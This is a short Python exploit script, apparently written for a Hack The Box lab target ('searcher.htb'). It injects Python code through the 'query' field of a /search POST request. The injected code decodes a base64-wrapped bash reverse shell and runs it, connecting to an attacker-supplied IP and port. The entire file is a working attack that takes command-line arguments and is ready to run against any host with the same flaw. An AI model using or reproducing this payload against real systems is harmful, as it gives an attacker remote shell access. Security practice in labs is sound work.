#!/bin/python3

import requests
import sys
import urllib3
import base64
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies={"http":"http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}

# HOST=sys.argv[1]


# TODO #1 Build a reverse shell payload using the CLI arguments provided by the user
def buildPayload():
    # This is our sanity check to confirm command injection. Follow this format and replace your system('COMMAND') as needed.
    # payload = f"',__import__('os').system('ping -c2 {ATK_Machine}'))#"

    rev_Shell = f"/bin/bash -l > /dev/tcp/{ATK_Machine}/{ATK_PORT} 0<&1 2>&1"
    byte_shell = rev_Shell.encode('ascii')
    b64_rev = base64.b64encode(byte_shell)
    payload = f"',__import__('os').system('echo {b64_rev.decode('ascii')}|base64 -d|bash -i'))#"
    return payload


# TODO #2 Make a POST request to /search
def make_request(payload):
    # Swap the commented request lines if you'd like to first send the request to a proxy on port 8080.
    #r = requests.post(f"http://{HOST}/search",proxies=proxies, verify=False, data={"engine":"Google","query":payload})
    r = requests.post(f"http://{HOST}/search", data={"engine":"Google","query":payload})

if __name__ == "__main__":
    try:
        HOST = sys.argv[1].strip()
        ATK_Machine = sys.argv[2]
        ATK_PORT = sys.argv[3]
        # print(sys.argv[1])
    except IndexError:
        print("[-] Error: You're missing a needed parameter.")
        print("[-] Usage: %s <hostname> <ATK_IP> <ATK_PORT>" % sys.argv[0])
        print("[-] Example: %s searcher.htb 10.10.14.10 4242" % sys.argv[0])
        exit(-1)
    finalPayload = buildPayload()
    make_request(finalPayload)
